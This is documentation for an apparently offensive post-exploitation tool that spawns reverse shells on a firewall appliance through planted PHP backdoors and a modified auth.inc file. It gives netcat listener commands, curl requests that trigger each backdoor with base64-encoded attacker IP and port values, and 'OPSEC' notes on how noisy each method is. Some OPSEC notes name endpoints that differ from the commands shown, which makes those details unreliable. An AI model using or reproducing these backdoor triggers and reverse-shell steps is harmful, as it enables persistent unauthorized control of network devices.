# Option 4: Reverse Shell Popper
- Doesn't require credentials to execute commands once uploaded.

## Skidy:
Enabled through option `3` at the main menu then selecting `Skidy`.

Manual:
```bash
$ nc -lvnp <PORT>
# Seperate terminal or background the above
$ curl -H 'Host: 192.168.190.190' 'http://192.168.190.190/RevShell.php?ip=192.168.190.154&port=4455'
```
Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 1
LPORT PORT:
-> 4455
Want a NC listener? (1) Yes (2) No
-> 1
Starting reverse shel
```
### OPSEC:
1 request sent:
- 1 GET request sent to `/RevShell.php` this contains a GET parameters `ip` and `port` which will return a php reverse shell.

---
## Amatuer:
Enabled through option `3` at the main menu then selecting `Amatuer`.

Manual:
```bash
$ nc -lvnp <PORT>
# Seperate terminal or background the above
$ echo -n "<IP> <PORT">
# e.g:
$ echo -n "192.168.190.154 4455" | base64
# MTkyLjE2OC4xOTAuMTU0IDQ0NTU=
$ curl -H 'Host: 192.168.190.190' 'http://192.168.190.190/interfaces_ipv6.php?host=MTkyLjE2OC4xOTAuMTU0IDQ0NTU='
```
Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 2
LPORT PORT:
-> 4455
Want a NC listener? (1) Yes (2) No
-> 1
Starting reverse shel
```
### OPSEC:
1 request sent:
- 1 GET request sent to `/vpn_l2tp_admin.php` this contains a `c` variable in the URL.
---
## Pro:
Enabled through option `3` at the main menu then selecting `Pro`.

Manual:
```bash
$ nc -lvnp <PORT>
# Seperate terminal or background the above
$ echo -n "<IP> <PORT">
# e.g:
$ echo -n "192.168.190.154 4455" | base64
# MTkyLjE2OC4xOTAuMTU0IDQ0NTU=
$ curl -X 'POST' -H 'Host: 192.168.190.190' -H 'Content-Type: application/x-www-form-urlencoded' --data-binary 'route=MTkyLjE2OC4xOTAuMTU0IDQ0NTU=' 'http://192.168.190.190/system_advanced_routes.php'
```
Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 3
LPORT PORT:
-> 4455
Want a NC listener? (1) Yes (2) No
-> 1
Starting reverse shel
```
### OPSEC:
1 request sent:
- 1 POST request sent to `/system_firewall_manager.php` this contains a `route` variable in the POST data.
---

## Leet:
Enabled through option `10` at the main menu.

`auth.inc` is altered to adjust the functionality of root `/` allowing for a reverse shell to be created. This takes a POST request and reads the `loggedin` of the request. This is a concatanation of IP and Port, this will return a php reverse shell.

Manual:

Would not advise doing manually due to CSRF tokens etc.

Through NoSense:
```bash
Pick One: 
(1) Skidy
(2) Amatuer
(3) Pro
(4) Leet
-> 4
LPORT PORT:
-> 4455
Want a NC listener? (1) Yes (2) No
-> 1
Executing
```

### OPSEC:
2 requests sent:
- 1 GET request to root `/` (this is to obtain the PHPSESSID and csrfMagicToken)
- 1 POST request to root `/` with csrfMagicToken and `loggedin` as variables in the POST data.
